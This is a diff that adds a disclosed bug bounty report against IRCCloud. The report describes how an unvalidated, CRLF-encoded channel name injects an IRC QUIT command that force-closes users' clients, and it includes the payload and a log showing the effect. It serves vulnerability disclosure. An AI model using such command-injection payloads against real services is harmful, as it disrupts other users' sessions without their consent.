@@ -1,0 +1,28 @@
+ReportLink:https://hackerone.com/reports/29480
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/mantis
+ReportedTo:IRCCloud(irccloud)
+BountyAmount:300.0
+Severity:
+State:Closed
+DateOfDisclosure:01.10.2014 13:47:16
+
+Summary:
+
+IRCCloud does not validate the channel names created by a user causing it to be parsed as an IRC command such as QUIT.
+
+This means the user can have their clients force-closed by a malicious channel name.
+
+This could also lead to other command injections such as forcing the handover of channels to other users for example (not tested).
+
+Here is my PoC of a malicious channel name:
+``#treehouse'){%0a%0dQUIT``
+
+``15:03:49  ⇐ SySTeM quit (sid12267@reid-aqa3e3.irccloud.com) Client exited
+15:04:02  → SySTeM joined #treehouse'){%0a%0dQUIT (sid12267@reid-aqa3e3.irccloud.com)
+15:04:04  ⇐ SySTeM quit (sid12267@reid-aqa3e3.irccloud.com) Client exited``
+
+If you require any further information, please let me know.
+
+All the best,
+Richard Clifford
